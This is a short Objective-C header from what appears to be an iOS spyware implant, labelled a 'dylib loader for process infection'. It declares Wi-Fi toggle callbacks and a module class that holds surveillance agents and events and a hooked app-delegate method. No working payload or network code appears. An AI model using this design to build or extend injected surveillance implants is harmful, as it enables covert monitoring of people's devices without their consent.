/*
 * RCSiOS - dylib loader for process infection
 *  pon pon 
 *
 *
 * Created on 22/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSILoader_h__
#define __RCSILoader_h__


#import "RCSICommon.h"
#import "RCSISharedMemory.h"

static void TurnWifiOn(CFNotificationCenterRef center, 
                       void *observer,
                       CFStringRef name, 
                       const void *object,
                       CFDictionaryRef userInfo);
static void TurnWifiOff(CFNotificationCenterRef center, 
                        void *observer,
                        CFStringRef name, 
                        const void *object,
                        CFDictionaryRef userInfo);

@interface dylibModule : NSObject 
{
  BOOL            mMainThreadRunning;
  NSMutableArray  *mAgentsArray;
  NSMutableArray  *mEventsArray;
  NSString        *mDylibName;
  id              mUIAppDelegate;
  IMP             mApplicationWillEnterForeground;
  time_t          mConfigId;
}

@property (readwrite, assign) NSMutableArray *mAgentsArray;
@property (readwrite, assign) NSMutableArray *mEventsArray;
@property (readwrite)         time_t         mConfigId;  

- (void)dylibMainRunLoop;
- (void)threadDylibMainRunLoop;

@end

#endif